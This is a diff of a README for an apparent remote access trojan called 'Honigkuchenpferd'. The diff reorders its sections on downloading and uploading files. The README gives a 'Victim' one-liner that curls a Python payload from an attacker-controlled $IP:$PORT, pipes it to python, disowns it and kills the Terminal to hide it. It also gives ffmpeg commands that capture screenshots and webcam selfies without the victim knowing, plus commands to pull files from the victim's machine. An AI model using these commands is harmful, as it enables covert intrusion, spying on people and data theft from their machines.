@@ -12,11 +12,21 @@ python2.7 and python3
 ```
 /bin/python3 srv.py
 ```
-
 ## Victim
 ```
 curl -s http://$IP:$PORT/Honigkuchenpferd.py | /usr/bin/python  & disown; killall Terminal
 ```
+
+
+## download File
+```
+[Honigkuchenpferd /home/Doofy/Dokumente/sus_stuff] download sus_text.txt
+```
+## upload File
+```
+[Honigkuchenpferd /home/Doofy/Dokumente/sus_stuff] upload sus_prog.bin
+```
+
 
 ## macOS:
 ### Screenshot
@@ -32,13 +42,4 @@ ffmpeg -f x11grab -framerate 1 -i :0.0 -vframes 1 screenshot.jpg
 ```
 #Selfie
 ffmpeg -f video4linux2 -s 640x480 -i /dev/video0 -ss 0:0:1 -frames 1 /tmp/selfie.jpg
-```
-
-## download File
-```
-[Honigkuchenpferd /home/Doofy/Dokumente/sus_stuff] download sus_text.txt
-```
-## upload File
-```
-[Honigkuchenpferd /home/Doofy/Dokumente/sus_stuff] upload sus_prog.bin
 ```
